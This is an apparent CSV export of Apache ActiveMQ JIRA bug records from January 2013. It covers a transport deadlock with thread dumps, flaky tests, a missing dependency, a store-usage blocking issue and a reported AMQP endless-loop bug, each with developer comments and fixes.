	at org.apache.maven.lifecycle.internal.LifecycleStarter.singleThreadedBuild(LifecycleStarter.java:183)
	at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:161)
	at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:320)
	at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:156)
	at org.apache.maven.cli.MavenCli.execute(MavenCli.java:537)
	at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:196)
	at org.apache.maven.cli.MavenCli.main(MavenCli.java:141)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:290)
	at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:230)
	at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:409)
	at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:352)
Caused by: org.apache.maven.plugin.PluginConfigurationException: Unable to parse configuration of mojo org.apache.activemq.tooling:activemq-maven-plugin:5.8-SNAPSHOT:run for parameter project: Cannot configure instance of org.apache.maven.project.MavenProject from ${${project}}
	at org.apache.maven.plugin.internal.DefaultMavenPluginManager.populatePluginFields(DefaultMavenPluginManager.java:597)
	at org.apache.maven.plugin.internal.DefaultMavenPluginManager.getConfiguredMojo(DefaultMavenPluginManager.java:529)
	at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:92)
	at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:209)
	... 19 more
Caused by: org.codehaus.plexus.component.configurator.ComponentConfigurationException: Cannot configure instance of org.apache.maven.project.MavenProject from ${${project}}
	at org.codehaus.plexus.component.configurator.converters.composite.ComponentDefaultValueSetter.configure(ComponentDefaultValueSetter.java:84)
	at org.codehaus.plexus.component.configurator.converters.composite.ObjectWithFieldsConverter.fromConfiguration(ObjectWithFieldsConverter.java:103)
	at org.codehaus.plexus.component.configurator.converters.ComponentValueSetter.configure(ComponentValueSetter.java:348)
	at org.codehaus.plexus.component.configurator.converters.composite.ObjectWithFieldsConverter.processConfiguration(ObjectWithFieldsConverter.java:161)
	at org.codehaus.plexus.component.configurator.BasicComponentConfigurator.configureComponent(BasicComponentConfigurator.java:56)
	at org.apache.maven.plugin.internal.DefaultMavenPluginManager.populatePluginFields(DefaultMavenPluginManager.java:567)
	... 22 more

",,ceposta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,308988,,,Thu Jan 24 21:17:14 UTC 2013,,,,,,,,,,,"0|i1dxn3:",289547,,,,,,,,,,,,,,,,,,,,,"24/Jan/13 21:05;ceposta;The javadoc annotations in BrokerMojo should be changed to not have the ${} tokens:

     * @parameter property=""${project}""
     * @required
     * @readonly

should be 

     * @parameter property=""project""
     * @required
     * @readonly;;;","24/Jan/13 21:17;ceposta;Fixed with r1438197;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Potential deadlock between FailoverTransport and AbstractInactivityMonitor,AMQ-4274,12629148,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,24/Jan/13 21:02,24/Jan/13 21:38,14/Jul/23 05:43,24/Jan/13 21:38,5.7.0,,,,,5.8.0,,,Transport,,,,0,,,,,,,,,"Its possible for an operation that's doing a send via oneway in FailoverTransport to deadlock with a Keep Alive write in the Inactivity Monitor.  

{code}
Found one Java-level deadlock:
=============================
""U.GeoCodingIncBuilder.1"":
  waiting for ownable synchronizer 0x00002aaac04e29e8, (a java.util.concurrent.locks.ReentrantLock$NonfairSync),
  which is held by ""ActiveMQ Session Task-42904""
""ActiveMQ Session Task-42904"":
  waiting for ownable synchronizer 0x00002ab3797e7348, (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync),
  which is held by ""ActiveMQ InactivityMonitor Worker""
""ActiveMQ InactivityMonitor Worker"":
  waiting to lock monitor 0x00002ab729f36a70 (object 0x00002aaac04f11d8, a java.lang.Object),
  which is held by ""ActiveMQ Session Task-42904""

Java stack information for the threads listed above:
===================================================
""U.GeoCodingIncBuilder.1"":
	at sun.misc.Unsafe.park(Native Method)
	- parking to wait for  <0x00002aaac04e29e8> (a java.util.concurrent.locks.ReentrantLock$NonfairSync)
	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:747)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:778)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1114)
	at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186)
	at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:66)
	at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
	at org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1290)
	at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1284)
	at org.apache.activemq.ActiveMQSession.<init>(ActiveMQSession.java:252)
	at org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:332)
	at linqmap.ipc.impl.jms.SingleJmsFactory.createSession(SingleJmsFactory.java:492)
	at linqmap.ipc.impl.jms.SingleJmsFactory.createSendSession(SingleJmsFactory.java:318)
	at linqmap.ipc.impl.jms.JmsQueue.send(JmsQueue.java:117)
	at linqmap.ipc.queues.wrappers.AsyncSender$2.run(AsyncSender.java:81)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)
	at java.lang.Thread.run(Thread.java:619)
""ActiveMQ Session Task-42904"":
	at sun.misc.Unsafe.park(Native Method)
	- parking to wait for  <0x00002ab3797e7348> (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync)
	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:747)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireShared(AbstractQueuedSynchronizer.java:877)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireShared(AbstractQueuedSynchronizer.java:1197)
	at java.util.concurrent.locks.ReentrantReadWriteLock$ReadLock.lock(ReentrantReadWriteLock.java:594)
	at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:268)
	at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)
	at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:104)
	at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:640)
	- locked <0x00002aaac04f11d8> (a java.lang.Object)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
	at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
	at org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1290)
	at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1284)
	at org.apache.activemq.ActiveMQSession.asyncSendPacket(ActiveMQSession.java:1898)
	at org.apache.activemq.ActiveMQSession.sendAck(ActiveMQSession.java:2064)
	at org.apache.activemq.ActiveMQSession.sendAck(ActiveMQSession.java:2059)
	at org.apache.activemq.ActiveMQMessageConsumer.acknowledge(ActiveMQMessageConsumer.java:1061)
	- locked <0x00002aaac06c7280> (a java.util.LinkedList)
	at org.apache.activemq.ActiveMQSession.acknowledge(ActiveMQSession.java:1604)
	at org.apache.activemq.ActiveMQMessageConsumer$1.execute(ActiveMQMessageConsumer.java:552)
	at org.apache.activemq.command.ActiveMQMessage.acknowledge(ActiveMQMessage.java:97)
	at linqmap.ipc.impl.jms.JmsQueue.onMessage(JmsQueue.java:262)
	at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1321)
	- locked <0x00002aaac06c0b70> (a java.lang.Object)
	at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131)
	at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)
	at java.lang.Thread.run(Thread.java:619)
""ActiveMQ InactivityMonitor Worker"":
	at org.apache.activemq.transport.failover.FailoverTransport.handleTransportFailure(FailoverTransport.java:252)
	- waiting to lock <0x00002aaac04f11d8> (a java.lang.Object)
	at org.apache.activemq.transport.failover.FailoverTransport$3.onException(FailoverTransport.java:209)
	at org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:101)
	at org.apache.activemq.transport.WireFormatNegotiator.onException(WireFormatNegotiator.java:160)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onException(AbstractInactivityMonitor.java:295)
	at org.apache.activemq.transport.AbstractInactivityMonitor$3.run(AbstractInactivityMonitor.java:168)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)
	at java.lang.Thread.run(Thread.java:619)

Found 1 deadlock.

{code}

The deadlock occurs when the write check task detects a failure and calls the onException method while holding the write lock side of the RW lock in the monitor.  Since the FailoverTransport holds its reconnect lock for the duration of the oneway call and the onException method of failover transport tries to lock that same mutex things can lock if the oneway call was waiting on the read lock side of the monitors R/W lock. 

The solution is to ensure that we always unlock the writelock before we call the next transports onException method but after we've set the failed flag so that any waiting oneway calls will fail and throw their IOException indicating the transport has already failed.  This will free the failover transport up to do its normal failure recovery processing.  ",,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,308987,,,Thu Jan 24 21:38:49 UTC 2013,,,,,,,,,,,"0|i1dxmv:",289546,,,,,,,,,,,,,,,,,,,,,"24/Jan/13 21:38;tabish;fixed on trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
No connection could be found for ID NC_,AMQ-4272,12629132,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,ceposta,mohitanchlia,mohitanchlia,24/Jan/13 19:44,27/Jan/13 21:49,14/Jul/23 05:43,27/Jan/13 21:49,,,,,,,,,Broker,,,,0,,,,,,,,,"When I got to ""Active Consumers"" and click one of the connections on the network of brokers to other MQ machine I get this message. Is this a expected behaviour?

Steps:
1. Setup 2 or more instances with network of broker
2. Open Admin -> Queue -> Active Consumer
3. Locate NC_* connection and click on that",,ceposta,mohitanchlia,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,308970,,,Sun Jan 27 21:49:07 UTC 2013,,,,,,,,,,,"0|i1dw8n:",289320,,,,,,,,,,,,,,,,,,,,,"24/Jan/13 20:27;ceposta;Which version you are using? 5.7?;;;","24/Jan/13 20:32;mohitanchlia;yes;;;","24/Jan/13 22:17;ceposta;I tried the set up you described:

Two brokers, networked with the activemq-static-broker1.xml and activemq-static-broker2.xml that come with the distribution. 

Then I set up the web console on broker2, attach consumer to broker1 and producer to broker2... 

Then I go to the web console, click on Queues --> active consumers, and I see the connections for the consumers just fine. Did i miss something? ;;;","24/Jan/13 22:19;mohitanchlia;The connection is not of the consumer but in the list it also shows up connection to the other broker. If you click that then you get that message.

It starts with NC_;;;","25/Jan/13 03:36;ceposta;I can reproduce. Taking a look now...;;;","27/Jan/13 21:49;ceposta;Fixed with commit r1439193

Link now points to network bridge page for networked consumers.

If you can check out the next nightly distribution and verify, that would be great.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DurableSubscriptionOfflineTest has several failures,AMQ-4268,12628941,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,kearls,kearls,23/Jan/13 19:19,08/Aug/13 14:03,14/Jul/23 05:43,08/Aug/13 14:03,,,,,,,,,Test Cases,,,,0,,,,,,,,,"testRedeliveryFlag fails intermittently, and testOfflineSubscriptionWithSelectorAfterRestart fails regularly
testNoDuplicateOnConcurrentSendTranCommitAndActivate and testCleanupDeletedSubAfterRestart fail, but very rarely",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4296,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Aug/13 12:11;kearls;AMQ-4268B.patch;https://issues.apache.org/jira/secure/attachment/12596830/AMQ-4268B.patch","23/Jan/13 19:37;kearls;AMQ4268.patch;https://issues.apache.org/jira/secure/attachment/12566176/AMQ4268.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,308438,,,Thu Aug 08 14:03:10 UTC 2013,,,,,,,Patch Available,,,,"0|i1c7xr:",279416,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"23/Jan/13 19:33;tabish;I know that a few tests in that test case have variations for different persistence adapters and such, can you add clarifications for the failure on which variants are failing, for instance the testOfflineSubscriptionWithSelectorAfterRestart test was only failing for LevelDB the last time I checked. ;;;","23/Jan/13 20:01;tabish;You can't change the test method name because it breaks the CombinationTestSupport mechanism which calls the init method for each test that has a combination.  In the case of the testOfflineSubscriptionWithSelectorAfterRestart test there is an init method initCombosForTestOfflineSubscriptionWithSelectorAfterRestart which varies the persistence adapter for each run of the test, like a JUnit 4 parameterized test. ;;;","23/Jan/13 20:05;kearls;Yes, I just realized that after I saw your comment, so I deleted the patch.
 ;;;","23/Jan/13 20:10;tabish;Added the fix for the redelivery test case, its true that it would fail in the case where the for loop got a random zero and didn't trigger the redelivery flag to be set. ;;;","04/Feb/13 17:41;tabish;LevelDB problem is the cause of one failure here. ;;;","08/Aug/13 12:10;kearls;This looks like it's working properly now.  However, there was a typo in one of the initCombos methods that prevented a couple of tests from running.  I will attach a patch, and after that this can be closed.
;;;","08/Aug/13 12:11;kearls;Update name of initCombosForTestOfflineSubscriptionAfterRestart so testOfflineSubscriptionAfterRestart is run for all three persistenceAdapaters.
;;;","08/Aug/13 14:03;tabish;fix applied, thanks. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
missing proton-api as dependency,AMQ-4266,12628741,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,zhigang,zhigang,22/Jan/13 16:52,22/Jan/13 17:01,14/Jul/23 05:43,22/Jan/13 17:01,5.8.0,,,,,5.8.0,,,Connector,,,,0,patch,,,,,,,,We missed proton-api as dependency.,,tabish,zgl,zhigang,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jan/13 16:53;zhigang;apache-activemq-proton-dependency.patch;https://issues.apache.org/jira/secure/attachment/12565966/apache-activemq-proton-dependency.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,307376,,,Tue Jan 22 17:01:49 UTC 2013,,,,,,,Patch Available,,,,"0|i1avw7:",271633,,,,,,,,,,,,,,,,,,,,,"22/Jan/13 17:01;tabish;Patch applied with thanks. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQ4220Test is failing,AMQ-4265,12628729,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,kearls,kearls,22/Jan/13 15:57,22/Jan/13 16:42,14/Jul/23 05:43,22/Jan/13 16:42,,,,,,5.8.0,,,Test Cases,,,,0,,,,,,,,,"This test is failing with error:

Failed to start per destination persistence adapter for destination: queue://TEST.QUEUE, options:[KahaDBPersistenceAdapter[/home/jenkins/jenkins-slave/workspace/ActiveMQ-Java7/activemq-core/target/activemq-data/mKahaDB/queue#3a#2f#2fTEST.QUEUE], KahaDBPersistenceAdapter[/home/jenkins/jenkins-slave/workspace/ActiveMQ-Java7/activemq-core/target/activemq-data/mKahaDB/queue#3a#2f#2fTEST.QUEUE]]

",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jan/13 16:01;kearls;AMQ4220.patch;https://issues.apache.org/jira/secure/attachment/12565960/AMQ4220.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,307364,,,Tue Jan 22 16:42:12 UTC 2013,,,,,,,Patch Available,,,,"0|i1avtj:",271621,Regression,,,,,,,,,,,,,,,,,,,,"22/Jan/13 16:01;kearls;The problem here is that when KahaDBPersistenceAdapter.doStart() is called the code registers an MBean, but when doStop() is called we don't unregister it.

I'm not sure this is the right way to fix this, or if it would have been better to add an unregisterMBean method to AnnotatedMBean.  If the latter is better let me know and I can submit another patch.
;;;","22/Jan/13 16:41;tabish;Patch seems fine except that it needs to check is JMX is enabled in the if statement. ;;;","22/Jan/13 16:42;tabish;Patch applied with fix for checking JMX state before trying to access the management context. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Pending send transaction can block on store usage and not resume once backlog is cleared,AMQ-4262,12628297,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,18/Jan/13 22:27,21/Jan/13 11:44,14/Jul/23 05:43,21/Jan/13 11:44,5.7.0,,,,,5.8.0,,,Message Store,,,,0,blocking,gc,kahadb,pfc,store,transactions,usage,,"A transacted send can block pending store usage, an active transaction will be visible to the store. This will block kahadb from gc of data files that occur after the inflight transaction. 
Consumers acking the pending messages can create additional data files that can't be gced. This is a problem because the queue can drain and not release the producer.
With message database trace is is possible to see:{code}
14:20:20,515 | INFO  | .0.1:51273@61616 | Queue                            | 125 - org.apache.activemq.activemq-core - 5.7.0.fuse-71-047 | Usage(default:store:queue://flood_out:store) percentUsage=99%, usage=30447772, limit=20971520, percentUsageMinDelta=1%;Parent:Usage(default:store) percentUsage=145%, usage=30447772, limit=20971520, percentUsageMinDelta=1%: Persistent store is Full, 100% of 20971520. Stopping producer (ID:..) to prevent flooding queue://flood_out. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 5650s)
.....

14:20:45,016 | TRACE | heckpoint Worker | MessageDatabase                  | 125 - org.apache.activemq.activemq-core - 5.7.0.fuse-71-047 | Last update: 30:453228, full gc candidates set: [11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
14:20:45,016 | TRACE | heckpoint Worker | MessageDatabase                  | 125 - org.apache.activemq.activemq-core - 5.7.0.fuse-71-047 | gc candidates after first tx:11:860775, []
14:20:45,016 | TRACE | heckpoint Worker | MessageDatabase                  | 125 - org.apache.activemq.activemq-core - 5.7.0.fuse-71-047 | gc candidates: []
{code}Here there is a build up of data files, after the inflight transaction, containing acks and messages that could be cleaned up.
 
The inflight transactions should protect a range of data files that they reference, not all subsequent data files.",,gtully,tmielke,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,305423,,,Mon Jan 21 11:44:15 UTC 2013,,,,,,,,,,,"0|i18ca7:",256792,,,,,,,,,,,,,,,,,,,,,"21/Jan/13 11:44;gtully;fix in http://svn.apache.org/viewvc?view=revision&revision=1436291

we now track the range of data files referenced by inflight transactions. this allows ack generated data from consumers to be gced;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MessageGroupLateArrivalsTest fails intermittently,AMQ-4260,12628121,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,17/Jan/13 23:01,17/Jan/13 23:22,14/Jul/23 05:43,17/Jan/13 23:22,,,,,,,,,Test Cases,,,,0,,,,,,,,,"MessageGroupLateArrivalsTest fails intermittently on some systems.  In the testConsumersLateToThePartyGetSomeNewGroups test, it looks like sometimes worker2 does not start in time, so worker1 consumes all of it's messages.",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Jan/13 23:02;kearls;AMQ4260.patch;https://issues.apache.org/jira/secure/attachment/12565387/AMQ4260.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,304972,,,Thu Jan 17 23:22:16 UTC 2013,,,,,,,Patch Available,,,,"0|i17x7j:",254350,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"17/Jan/13 23:22;tabish;patch applied, tests still passing here. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Endless loop when received incorrect AMQP message,AMQ-4258,12627699,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,chirino,rbalent,rbalent,15/Jan/13 18:23,23/Jan/13 14:54,14/Jul/23 05:43,23/Jan/13 14:54,5.8.0,,,,,5.8.0,,,Transport,,,,0,,,,,,,,,"When you send incorrect message to AMQP transform, it will stuck in endless loop and write lot of error messages to console output.

This way, you can send numbers of incorrect messages and ActiveMQ will create new thread for each of them. This way can attacker create thousands of threads in few minutes and completely overload server machine.

Problem is in org.apache.activemq.transport.amqp.AmqpProtocolConverter class. It throws exception(exception.txt) and loop never ends:

Line 158:
int count = protonTransport.input(frame.data, frame.offset, frame.length);

Two solutions are possible:

1. Add ""return"" statement to catch block (patch1.txt).
2. Run ""frame.moveHead(count);"" in finally block with some default positive count (patch2.txt)

I would prefer the first variant.

This happens when you try to send message from client with older version of AMQP protocol.",,rbalent,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jan/13 18:24;rbalent;exception.txt;https://issues.apache.org/jira/secure/attachment/12564964/exception.txt","15/Jan/13 18:24;rbalent;patch1.txt;https://issues.apache.org/jira/secure/attachment/12564962/patch1.txt","15/Jan/13 18:24;rbalent;patch2.txt;https://issues.apache.org/jira/secure/attachment/12564963/patch2.txt",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,304486,,,Wed Jan 23 14:54:58 UTC 2013,,,,,,,Patch Available,,,,"0|i17muf:",252670,,,,,,,,,,,,,,,,,,,,,"22/Jan/13 18:44;tabish;@Hiram, can you take a look at this one. ;;;","23/Jan/13 14:54;chirino;Patch applied.  Many thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BrokerXmlConfigStartTest fails intermittently,AMQ-4254,12627470,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,kearls,kearls,14/Jan/13 18:13,15/Jan/13 22:06,14/Jul/23 05:43,15/Jan/13 22:06,,,,,,5.8.0,,,Test Cases,,,,0,,,,,,,,,"BrokerXmlConfigStartTest.testStartBrokerUsingSampleConfig fails intermittently on Hudson/Jenkins with the error 

""Error creating bean with name 'Server' defined in file [/home/hudson/hudson-slave/workspace/ActiveMQ-Java7/assembly/target/conf/jetty-demo.xml]: Invocation of init method failed; nested exception is java.net.BindException: Address already in use""

I will attach a patch with this test rewritten as a JUnit4 Parameterized test. This creates runs each config as a separate test case and seems to resolve the broker start/stop issue.",,kearls,kearls@redhat.com,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jan/13 18:15;kearls;AMQ4254.patch;https://issues.apache.org/jira/secure/attachment/12564746/AMQ4254.patch","15/Jan/13 21:28;kearls;AMQ4254a.patch;https://issues.apache.org/jira/secure/attachment/12565010/AMQ4254a.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,304254,,,Tue Jan 15 22:06:47 UTC 2013,,,,,,,Patch Available,,,,"0|i17ksn:",252338,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"14/Jan/13 18:15;kearls;Updated version of BrokerXmlConfigStartTest;;;","14/Jan/13 18:27;tabish;Patch looks good.  Applied it, lets see how the next run goes. ;;;","14/Jan/13 22:54;kearls@redhat.com;Hi Tim,

Unfortunately this just failed again on the Fuse Hudson.  Is there anyway to definitively know shutdown has completed after calling broker.stop(), or should I just try writing a retry loop around broker.start?

Kevin



